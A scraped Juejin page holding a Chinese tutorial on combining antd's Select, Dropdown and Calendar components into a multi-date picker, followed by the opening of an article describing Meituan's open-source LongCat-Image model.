28px;font-size:16px;margin:22px 0}.markdown-body h4:before{width:20px;height:20px;background-size:20px 20px}.markdown-body h5{position:relative;padding:4px 26px;font-size:15px;margin:20px 0}.markdown-body h5:before{width:18px;height:18px;background-size:18px 18px}.markdown-body h6{position:relative;padding:4px 22px;font-size:14px;margin:16px 0}.markdown-body h6:before{width:16px;height:16px;background-size:16px 16px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#36ace1,#dff0fe,#36ace1);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:50px;height:24px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAEgElEQVRIS72Va0xbZRjH/z2FcimbchEQFDYRCIRAAWFQ2MaCXBwmUxYDLGGEcRFkH9wmk04zG0Bo2dwNIisERANqhjqdEmhd4nRbuwpsXDYWLLoRgeG4Chu9QHvMOQ0dpTAKH3y/tDnv8/5/z/Oc//scBv6nxdgoJ14gVYPEuITHdTdHY12gRIH0T0KljlqwthqUFHGtzAEsxqwLtPvkdc+FeeI3BgMeAMEhdOqR1mM7xswBrgmKE8pfIUhtm7fbZsft/i7wc98MtrUFxmbU6ByYgFwxjtFp5Q+WpF1mCy9wajXoqqD4E91saOf603e+5B7t99xTkyZJEiKJAl2DE9Xio1HvrBS8IuhVwVUP503swdJ9QWAw1izaoDs6pQT/655BMS9yy3KYiUoM/7adu7NmtnQfx5zWm8Q8Ui3gyGcddyU8rv/STRNQouDGP5/mhTubX4dpPv3DMzh1qS9LwuPWr+i63WVyn5QYj/4d/i4bqmbpoQ+auvBlQYghX6PE4wTSOzV5EUYlb5Q4MDqLk9/3cMRF27spDSNQamUnWZ4ebNB+OKNCyYVeFCZ5wZ5tiePN/UiP2YoQL0cUX+iFt4sNUiLdcaVvHJLecQiWnKVE8s5LvxAXRWeYgHLre0hecgAN0sxr0XBZgbJUP6OiLnaM4ivZCBrzOWBZEIY9rY5E8pl2nM0KMzzLq5aPiXmRzgbQm2VyR8KGGK/ICAFB6IusbvsDwhRf+n/jtSHc/nsGgjR9V6/1TyLa1wGU+FtnO1CbHQTHTSzIFJOYJ1jwcGLTccMTcyhp7oW4KFJ/SV4/IScrc55kQj07WNuOn94Lpw8kCm/Qv3W5HLjbWxsyfuNUO1TzWjAJBloKt2FBS+Jz6ShiA12NupBdLWugQcmn28lPMkONNql3U5cTSD9Lq+qEUqPFt++G0aKL687wDAqb+pAU7IKCuK2493AOPQ9UCNpib6T1tkg+RZ9KKJcNn8sJc1vac8o16jklLWLuOiDqwvHUIKPw7vtTON+iCDKkl/Cx9FeSYET5um1mHt6jN0Dz9ftwYjORudNjTdaBmi7kxvvA1d6Gjs0X/Q5Sp3tMEMSHre9HnDEZAPFCWUNVdliGJVPvqEP1Hbh4yPj9LadSY6fu6gPsCX+B3mq7NYLv2od8fj4aoViMNQGFijos/XVMTXGavgUisQIle71hwVx9KFEutLVjw8GORTuxoEbeJS7iPrmQyy/sIj2hQpqYHO7ZGs95nnZS4y8K8Pfqrb58UZ+IlKqbqNgfQm8da+pC9xjLqo8foFkau2qaCeXSyvzXfA9SDrp1bxJ/DU/jSJKXEWdBR2J/9U0UpwXTFZ/+8S76h/71FvO4A8sTeuqQThDKalOiPLN3BbhiYlaNsm964elkCztrC4xMqeDqYIus2JdB3cbS5l4MTag44qJt9GxbF4gKThRKY59lW13+KCUQ1pZMEwHKviKx4pFSqXzxCn/X9Gr2NO+zw+cTiTbxmUyCqH3GlsWg2kRNhOnHmhlrFkIvHTZt1borWvMCmRnwH4usn58STiycAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body del{color:#36ace1}.markdown-body code{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#282c34;color:#4ec9b0;padding:.24em .46em;margin:0 4px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-family:Menlo,Monaco,Consolas,Courier New,monospace;font-size:12px;border-radius:10px;padding:15px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#4ec9b0;background:#282c34}.markdown-body a{text-decoration:none;color:#409eff;border-bottom:1px solid #409eff}.markdown-body a:active,.markdown-body a:hover{color:#007bff;border-bottom:1px solid #007bff}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{position:relative;padding:8px 26px;background-color:rgba(54,172,225,.75);margin:16px 0;border-left:4px solid #409eff;border-radius:5px}.markdown-body blockquote:before{content:"❝";top:10px;left:8px;color:#409eff;font-size:20px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:20px;position:absolute;right:8px;bottom:0;color:#409eff;opacity:.7}.markdown-body blockquote&gt;p{color:#fff}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><code>antd 版本 3.19.3</code>
先说一下我遇到的问题，项目中需要做多日期对比，本来想使用 <code>DatePicker</code> 组件，每次选择一个日期，感觉这样写太过简单，于是，就想结合 <code>Select</code> 和 <code>Calendar</code> 组件一起使用，想法是很美好的，操作起来就困难重重了，我想要的效果如下图：</p>
</blockquote>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/184a51aad9e14fe28ac1b61f257c73a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852079&amp;x-signature=T%2F7CM9MtlHiqwRy5bOGi2OZdkr0%3D" width="40%" loading="lazy"/>
<p>采用的是<code>Select</code> 的中 <code>dropdownRender</code>自定义下拉框内容，但是自定义内容中包含<code>Select</code>的话就会因失去焦点而关闭，无法选择，查了很多资料，都说如下方法可以解决，试了很多次都无效，于是就换了一种写法，自己写一个类似<code>Select</code>的组件不就行了，于是就选择了<code>Dropdown</code>。</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;<span class="hljs-title class_">Select</span>
  dropdownRender={<span class="hljs-function">() =&gt;</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>
      <span class="hljs-attr">onMouseDown</span>=<span class="hljs-string">{(e)</span> =&gt;</span> {
        e.preventDefault();
        e.stopPropagation();
      }}
    &gt;
      Some Content
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )}
/&gt;
</code></pre>
<p>对于 <code>Calendar</code>组件，要使用<code>dateFullCellRender</code>，重新单元格，方便添加选中样式，只需要稍微修改一下样式就可以了。</p>
<pre><code class="hljs language-css" lang="css">// CalendarPage<span class="hljs-selector-class">.css</span>
<span class="hljs-selector-class">.my_calendar</span> <span class="hljs-selector-class">.ant-fullcalendar-cell</span> <span class="hljs-selector-class">.ant-fullcalendar-selected-day</span> <span class="hljs-selector-class">.ant-fullcalendar-value</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span> <span class="hljs-meta">!important</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#1677ff</span> <span class="hljs-meta">!important</span>;
}

<span class="hljs-selector-class">.my_calendar</span> <span class="hljs-selector-class">.ant-fullcalendar-cell</span><span class="hljs-selector-class">.ant-fullcalendar-selected-day</span> <span class="hljs-selector-class">.ant-fullcalendar-value</span> {
  <span class="hljs-attribute">color</span>: unset;
  <span class="hljs-attribute">background</span>: unset;
}

<span class="hljs-selector-class">.my_calendar_menu</span> {
  <span class="hljs-attribute">max-height</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">overflow</span>: auto;
}
</code></pre>
<p><code>Calendar</code>组件二次封装</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Calendar</span>, <span class="hljs-title class_">Card</span>, <span class="hljs-title class_">Row</span>, <span class="hljs-title class_">Col</span>, <span class="hljs-title class_">Menu</span>, <span class="hljs-title class_">Dropdown</span>, <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">DownOutlined</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ant-design/icons'</span>
<span class="hljs-keyword">import</span> moment <span class="hljs-keyword">from</span> <span class="hljs-string">'moment'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./CalendarPage.css'</span>
<span class="hljs-keyword">const</span> dateFormat = <span class="hljs-string">'YYYY-MM-DD'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">CalendarPage</span>(<span class="hljs-params">props</span>) {
  <span class="hljs-keyword">const</span> { values, handleSelect, ...resProps } = props
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Card</span>
      <span class="hljs-attr">bodyStyle</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> <span class="hljs-attr">0</span>, <span class="hljs-attr">width:</span> <span class="hljs-attr">300</span> }}
      <span class="hljs-attr">onMouseDown</span>=<span class="hljs-string">{e</span> =&gt;</span> {
        e.preventDefault()
      }}
      style={{ width: 300 }}
    &gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">Calendar</span>
        <span class="hljs-attr">headerRender</span>=<span class="hljs-string">{({</span> <span class="hljs-attr">value</span>, <span class="hljs-attr">type</span>, <span class="hljs-attr">onChange</span>, <span class="hljs-attr">onTypeChange</span> }) =&gt;</span> {
          const start = 0
          const end = 12
          const monthOptions = []
          const current = value.clone()
          const localeData = value.localeData()
          const months = []
          for (let i = 0; i &lt; 12; i++) {
            current.month(i)
            months.push(localeData.monthsShort(current))
          }
          for (let index = start; index &lt; end; index++) {
            monthOptions.push(
              <span class="hljs-tag">&lt;<span class="hljs-name">Menu.Item</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"month-item"</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{</span>`${<span class="hljs-attr">index</span>}`}&gt;</span>
                {months[index]}
              <span class="hljs-tag">&lt;/<span class="hljs-name">Menu.Item</span>&gt;</span>
            )
          }
          const month = value.month()
          const year = value.year()
          const options = []
          for (let i = year - 10; i &lt; year + 10; i += 1) {
            options.push(
              <span class="hljs-tag">&lt;<span class="hljs-name">Menu.Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{i}</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{i}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"year-item"</span>&gt;</span>
                {i}
              <span class="hljs-tag">&lt;/<span class="hljs-name">Menu.Item</span>&gt;</span>
            )
          }
          const menu = (
            <span class="hljs-tag">&lt;<span class="hljs-name">Menu</span>
              <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{newYear</span> =&gt;</span> {
                const now = value.clone().year(newYear.key)
                onChange(now)
              }}
              className="my_calendar_menu"
            &gt;
            	{options}
            <span class="hljs-tag">&lt;/<span class="hljs-name">Menu</span>&gt;</span>
          )
          const menu2 = (
            <span class="hljs-tag">&lt;<span class="hljs-name">Menu</span>
              <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{selectedMonth</span> =&gt;</span> {
                const newValue = value.clone()
                newValue.month(parseInt(selectedMonth.key, 10))
                onChange(newValue)
              }}
              className="my_calendar_menu"
            &gt;
            	{monthOptions}
            <span class="hljs-tag">&lt;/<span class="hljs-name">Menu</span>&gt;</span>
          )
          return (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> <span class="hljs-attr">10</span> }}&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">Row</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"flex"</span> <span class="hljs-attr">justify</span>=<span class="hljs-string">"end"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Col</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">Dropdown</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span> <span class="hljs-attr">overlay</span>=<span class="hljs-string">{menu}</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>
                      {String(year)}
                      <span class="hljs-tag">&lt;<span class="hljs-name">DownOutlined</span> /&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
                  <span class="hljs-tag">&lt;/<span class="hljs-name">Dropdown</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">Col</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Col</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">Dropdown</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span> <span class="hljs-attr">overlay</span>=<span class="hljs-string">{menu2}</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">marginLeft:</span> <span class="hljs-attr">10</span> }}&gt;</span>
                      {months[month]}
                      <span class="hljs-tag">&lt;<span class="hljs-name">DownOutlined</span> /&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
                  <span class="hljs-tag">&lt;/<span class="hljs-name">Dropdown</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">Col</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">Row</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )
        }}
        fullscreen={false}
        className="calendar"
        dateFullCellRender={date =&gt; {
          let de = moment(date).format(dateFormat)
          let cls = ''
          if (values &amp;&amp; values.indexOf(de) !== -1) {
            cls = 'ant-fullcalendar-selected-day'
          } else {
            cls = ''
          }
          return (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
              <span class="hljs-attr">className</span>=<span class="hljs-string">{cls}</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
                handleSelect &amp;&amp; handleSelect(moment(date).format(dateFormat))
              }}
            &gt;
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"ant-fullcalendar-value"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">textAlign:</span> '<span class="hljs-attr">center</span>' }}&gt;</span>
                {moment(date).date()}
              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )
        }}
        {...resProps}
      /&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">Card</span>&gt;</span></span>
  )
}
</code></pre>
<p>使用</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">CalendarPage</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./CalendarPage'</span>
&lt;<span class="hljs-title class_">Select</span>
  dropdownRender={<span class="hljs-function">() =&gt;</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">CalendarPage</span>
      	<span class="hljs-attr">handleSelect</span>=<span class="hljs-string">{e</span>=&gt;</span>{
      		// 逻辑处理，动态设置values
      	}
      	values={['2023-06-01', '2023-06-25']}
      /&gt;</span>
  )}
/&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LongCat-Image：美团的轻量化图像生成与编辑新标杆]]></title>    <link>https://juejin.cn/post/7581378364081569838</link>    <guid>https://juejin.cn/post/7581378364081569838</guid>    <pubDate>2025-12-09T00:01:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581378364081569838" data-draft-id="7581378364081553454" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LongCat-Image：美团的轻量化图像生成与编辑新标杆"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-09T00:01:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="围炉聊科技"/> <meta itemprop="url" content="https://juejin.cn/user/3229679898597516"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LongCat-Image：美团的轻量化图像生成与编辑新标杆
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3229679898597516/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    围炉聊科技
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T00:01:58.000Z" title="Tue Dec 09 2025 00:01:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前两天才盘点图生图的开源大模型，2025年12月8日，美团就发布了其开源图像生成与编辑模型LongCat-Image。作为一款仅60亿参数的轻量化模型，它在文生图和图像编辑两大核心能力上却达到了开源领域的SOTA水平，甚至逼近头部闭源模型。<strong>LongCat-Image最大的创新在于实现了"生成与编辑一体化"，通过统一架构处理多元任务，避免了传统模型在生成与编辑切换中的能力损耗</strong>。对于技术社区而言，这不仅是一个高性能的图像生成工具，更是一次对中文图像生成生态的重要突破。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928326d250504e6a9565a04c53811c06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu054KJ6IGK56eR5oqA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765843317&amp;x-signature=RWx5MCqLK2ugUiqA5aRzhsJNPj8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-0">一、模型概述：轻量化设计下的能力跃迁</h3>
<p>LongCat-Image是美团LongCat团队研发的图像生成与编辑基础模型，参数规模为6B（60亿），属于轻量化大模型。与之前动辄百亿参数的主流模型相比，它通过创新架构设计和系统性训练策略，在保持高生成质量的同时大幅降低了计算资源需求。模型已在GitHub和Hugging Face平台开源，遵循MIT许可协议，这意味着开发者可以自由地用于个人研究或商业应用，只需保留原始版权声明。</p>
<p>技术架构上，LongCat-Image采用文生图与图像编辑同源的混合骨干架构（MM-DiT+Single-DiT），并整合了视觉语言模型（VLM）条件编码器  。这种设计使模型能够通过一套架构同时处理文本生成图像和自然语言指令编辑任务，避免了传统模型在生成与编辑切换中的能力损耗。<strong>在训练策略上，团队构建了全流程质控体系：预训练阶段过滤AIGC数据并引入千万量级合成文字数据，SFT阶段采用人工精筛数据对齐大众审美，RL阶段创新性地引入AIGC内容检测器作为奖励模型，引导模型学习真实世界的物理纹理与光影质感</strong>  。</p>
<p>从应用场景来看，LongCat-Image展现出跨领域潜力：电商领域可快速生成商品展示图与促销海报，餐饮场景能制作食材宣传素材，传统文化领域可实现古籍插图与对联的数字化创作，游戏行业能辅助生成场景与角色初稿  。美团通过开源释放技术能力，既为自身业务的智能化升级储备工具，也为全行业提供了中文场景下的AIGC解决方案。</p>
<h3 data-id="heading-1">二、图生图功能深度解析：15类编辑任务的精准掌控</h3>
<p>LongCat-Image的图生图功能（即图像编辑）是其最大亮点之一。<strong>模型支持物体增删、风格迁移、视角转换、文本修改等15类细分编辑任务，并在多轮编辑中能保持图像风格、光照与原图的高度一致性，避免了"拼接感"问题</strong>  。这一能力源于其独特的技术实现机制。</p>
<p>首先，模型采用"文生图 Mid-training阶段初始化+多任务联合学习"机制，既继承了生成模型的美感基础，又保障了编辑指令的多样性响应能力  。通过在中期训练阶段冻结部分参数并引入编辑任务数据，模型能够更好地理解复杂多样的指令，同时保持生成质量。</p>
<p>其次，针对中文文本渲染这一行业痛点，LongCat-Image通过课程学习策略提升字符覆盖度和渲染精准度。<strong>预训练阶段基于千万量级合成数据学习字形，覆盖通用规范汉字表的8105个汉字；SFT阶段引入真实世界文本图像数据，提升在字体、排版布局上的泛化能力；RL阶段融入OCR与美学双奖励模型，进一步提升文本准确性与背景融合自然度</strong>  。此外，模型对prompt中指定渲染的文本采用字符级编码，大幅降低模型记忆负担，实现文字生成学习效率的跨越式提升。</p>
<p>在性能方面，LongCat-Image在GEdit-Bench中英文评测中获7.60/7.64分，ImgEdit-Bench评测中获4.50分，均达到开源SOTA水平，且逼近头部闭源模型  。在多轮编辑质量评估中，尽管与Nano Banana、Seedream 4.0等商业模型存在一定差距，但显著超越了其他开源方案  。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c16568692bad42fc9d74ae12c48bc141~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu054KJ6IGK56eR5oqA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765843317&amp;x-signature=4it%2Fg5fqlN1GNr%2BzyWGIbwydwT8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-2">三、与之前图生图模型的对比：中文渲染与编辑一致性的突破</h3>
<p>与之前的图生图模型相比，LongCat-Image在综合编辑质量、视觉一致性这两个用户体验的维度显著超越了其他开源方案，虽然与 Nano Banana、Seedream 4.0 等商业模型存在一定差距。</p>
